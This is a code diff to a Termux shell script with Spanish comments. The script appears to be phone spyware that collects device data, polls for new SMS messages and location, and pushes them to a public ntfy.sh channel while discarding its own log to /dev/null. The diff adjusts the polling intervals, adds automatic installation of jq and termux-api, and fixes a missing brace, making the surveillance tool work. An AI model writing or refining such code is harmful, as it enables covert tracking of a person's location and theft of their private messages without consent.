@@ -2,10 +2,21 @@
 
 # === CONFIGURACIÓN ===
 NTFY_URL="https://ntfy.sh/3kG4epWMkei6KLLq"  # tu canal NTFY público
-INTERVALO=9999  # Intervalo principal en segundos (1 hora)
-LOC_INTERVAL=1  # Intervalo para ubicación (5 minutos)
+INTERVALO=3600  # Intervalo principal en segundos (1 hora)
+LOC_INTERVAL=300  # Intervalo para ubicación (5 minutos)
 LOGFILE="/dev/null"
 SMS_LAST_ID_FILE="$HOME/.ultimo_sms_id"
+
+# === INSTALAR DEPENDENCIAS FALTANTES ===
+if ! command -v jq &> /dev/null; then
+    echo "Instalando jq..."
+    pkg install -y jq
+fi
+
+if ! command -v termux-location &> /dev/null; then
+    echo "Instalando Termux:API..."
+    pkg install -y termux-api
+fi
 
 # === FUNCIÓN PARA ENVIAR MENSAJES ===
 enviar_ntfy() {
@@ -97,7 +108,7 @@ recopilar_datos() {
             sleep 1
         done
     fi
-}  # <--- Esta llave faltaba en tu versión original
+}
 
 # === MONITOREO DE NUEVOS SMS ===
 monitor_sms() {
@@ -113,7 +124,7 @@ monitor_sms() {
                 echo "$CURRENT_ID" > "$SMS_LAST_ID_FILE"
             fi
         fi
-        sleep 1  # Verificar cada 30 segundos
+        sleep 30  # Verificar cada 30 segundos
     done
 }
 
